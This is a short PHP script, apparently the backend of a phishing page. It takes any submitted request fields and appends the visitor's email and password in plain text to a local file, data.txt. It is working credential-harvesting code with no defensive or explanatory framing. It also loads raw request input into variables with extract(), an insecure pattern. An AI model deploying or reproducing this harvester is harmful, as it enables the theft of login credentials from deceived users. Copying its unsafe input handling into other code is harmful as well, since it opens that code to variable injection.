<?php
    extract($_REQUEST);
    $file=fopen("data.txt","a");

    fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $pass ."\n");
    fclose($file);
 ?>
